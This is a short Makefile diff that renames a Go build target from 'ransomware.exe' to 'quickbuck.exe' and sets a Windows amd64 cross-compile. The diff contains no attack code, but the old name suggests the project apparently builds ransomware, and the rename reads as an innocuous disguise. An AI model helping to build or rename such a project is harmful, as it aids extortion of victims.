@@ -1,6 +1,7 @@
-ransomware.exe: $(wildcard cmd/* lib/*/*)
-ransomware.exe: GOOS=windows
+quickbuck.exe: $(wildcard cmd/* lib/*/*)
+quickbuck.exe: export GOOS=windows
+quickbuck.exe: export GOARCH=amd64
 
-ransomware.exe:
-	go build -o ransomware.exe ./cmd
+quickbuck.exe:
+	go build -o $@ ./cmd
 
